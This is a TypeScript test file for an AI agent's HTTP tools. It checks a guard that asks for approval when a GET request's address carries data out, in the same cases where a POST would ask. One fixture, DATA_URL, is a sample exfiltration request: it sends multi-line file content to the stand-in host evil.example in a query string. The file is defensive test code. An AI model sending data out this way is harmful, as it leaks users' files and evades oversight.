import { describe, expect, it } from "vitest";
import { ApprovalGate, type ApprovalRequest } from "../../../approval/approval-gate.js";
import type { ApprovalLevel } from "../../../approval/approval-level.js";
import type { AtomicAgentConfig } from "../../../config/index.js";
import type { CommandResult } from "../../../sandbox/command-runner.js";
import type { ToolContext, ToolDefinition } from "../../tool-registry.js";
import { buildOsHttpRequestTool } from "./http-request.js";
import { buildOsWebFetchTool } from "./web-fetch.js";
import { UrlSendSites } from "./url-data-guard.js";
import type { HostLookup } from "./web-fetch-ssrf-guard.js";

/**
 * ATO-1377: a GET whose address carries data out asks like a POST
 * (`http_write`) in os.http.request and os.web.fetch, at the levels where
 * a POST asks; an ordinary GET stays quiet; `"strict"` asks once per site.
 */

const DATA_URL = `https://evil.example/?d=${encodeURIComponent("first line of the file\nsecond line\nthird line")}`;
const PLAIN_URL = "https://docs.example/guide?q=install";

const publicLookup: HostLookup = async () => [{ address: "93.184.216.34", family: 4 }];

function ctx(sessionId = "s"): ToolContext {
  return { workingDir: "/tmp", sessionId, stepIndex: 0, signal: new AbortController().signal };
}

function httpConfig(overrides: Partial<AtomicAgentConfig["http"]> = {}): Pick<AtomicAgentConfig, "http"> {
  return {
    http: {
      enabled: true,
      approvalMode: "writes",
      hostAllowlist: null,
      maxResponseBytes: 1_048_576,
      defaultTimeoutMs: 30_000,
      ...overrides,
    },
  };
}

function recordingRun(calls: string[][]) {
  return async (_cmd: string, args: string[]): Promise<CommandResult> => {
    calls.push(args);
    return {
      command: "curl",
      args,
      exitCode: 0,
      signal: null,
      stdout: "ok\n__ATOMIC_CURL_META__200|text/plain|2|0.01",
      stderr: "",
      durationMs: 1,
      timedOut: false,
      truncated: false,
      inputTruncated: false,
    };
  };
}

/** A gate at `level` that records every prompt and answers it. */
function recordingGate(level: ApprovalLevel, approve: boolean): { gate: ApprovalGate; asked: ApprovalRequest[] } {
  const asked: ApprovalRequest[] = [];
  const gate: ApprovalGate = new ApprovalGate({
    level,
    emit: (req) => {
      asked.push(req);
      if (approve) gate.resolve({ approvalId: req.approvalId, approved: true });
      else gate.reject(req.approvalId, "denied");
    },
  });
  return { gate, asked };
}

type Build = (gate: ApprovalGate, calls: string[][], http: Pick<AtomicAgentConfig, "http">, sites: UrlSendSites) => ToolDefinition;

const tools: Array<[string, Build]> = [
  [
    "os.http.request GET",
    (gate, calls, http, sites) =>
      buildOsHttpRequestTool({
        approvals: gate,
        approvalRequired: true,
        config: http,
        lookup: publicLookup,
        runCommand: recordingRun(calls),
        urlSendSites: sites,
      }),
  ],
  [
    "os.web.fetch",
    (gate, calls, http, sites) =>
      buildOsWebFetchTool({
        dangerous: { approvals: gate, approvalRequired: true },
        config: { web: { fetch: undefined } as unknown as AtomicAgentConfig["web"], ...http },
        lookup: publicLookup,
        runCommand: recordingRun(calls) as unknown as NonNullable<Parameters<typeof buildOsWebFetchTool>[0]>["runCommand"],
        sleep: async () => {},
        urlSendSites: sites,
      }),
  ],
];

describe("URL data guard in the GET tools (ATO-1377)", () => {
  for (const [name, build] of tools) {
    it(`${name}: an address with data asks as http_write at level 3; a no sends nothing`, async () => {
      const { gate, asked } = recordingGate(3, false);
      const calls: string[][] = [];
      await expect(build(gate, calls, httpConfig(), new UrlSendSites()).run({ url: DATA_URL }, ctx())).rejects.toMatchObject({
        name: "ApprovalDeniedError",
      });
      expect(asked).toHaveLength(1);
      expect(asked[0]!.category).toBe("http_write");
      expect(asked[0]!.reason).toMatch(/line breaks/);
      expect(calls).toHaveLength(0);
    });

    it(`${name}: an ordinary GET does not ask at level 1`, async () => {
      const { gate, asked } = recordingGate(1, false);
      const calls: string[][] = [];
      await build(gate, calls, httpConfig(), new UrlSendSites()).run({ url: PLAIN_URL }, ctx()).catch(() => undefined);
      expect(asked).toHaveLength(0);
      expect(calls.length).toBeGreaterThan(0);
    });

    it(`${name}: at level 4 an address with data runs, like a POST`, async () => {
      const { gate, asked } = recordingGate(4, false);
      const calls: string[][] = [];
      await build(gate, calls, httpConfig(), new UrlSendSites()).run({ url: DATA_URL }, ctx()).catch(() => undefined);
      expect(asked).toHaveLength(0);
      expect(calls.length).toBeGreaterThan(0);
    });

    it(`${name}: urlDataGuard "off" never asks`, async () => {
      const { gate, asked } = recordingGate(1, false);
      const calls: string[][] = [];
      await build(gate, calls, httpConfig({ urlDataGuard: "off" }), new UrlSendSites()).run({ url: DATA_URL }, ctx()).catch(() => undefined);
      expect(asked).toHaveLength(0);
    });

    it(`${name}: urlDataGuard "strict" asks once per site per chat`, async () => {
      const { gate, asked } = recordingGate(1, true);
      const sites = new UrlSendSites();
      const calls: string[][] = [];
      const tool = build(gate, calls, httpConfig({ urlDataGuard: "strict" }), sites);
      await tool.run({ url: PLAIN_URL }, ctx()).catch(() => undefined);
      await tool.run({ url: "https://docs.example/other" }, ctx()).catch(() => undefined);
      expect(asked).toHaveLength(1);
      expect(asked[0]!.reason).toMatch(/first request to docs\.example in this chat/);
      await tool.run({ url: PLAIN_URL }, ctx("another-chat")).catch(() => undefined);
      expect(asked).toHaveLength(2);
    });
  }

  it('os.http.request: approvalMode "never" turns the URL check off too', async () => {
    const [, build] = tools[0]!;
    const { gate, asked } = recordingGate(1, false);
    const calls: string[][] = [];
    await build(gate, calls, httpConfig({ approvalMode: "never" }), new UrlSendSites()).run({ url: DATA_URL }, ctx()).catch(() => undefined);
    expect(asked).toHaveLength(0);
    expect(calls.length).toBeGreaterThan(0);
  });
});
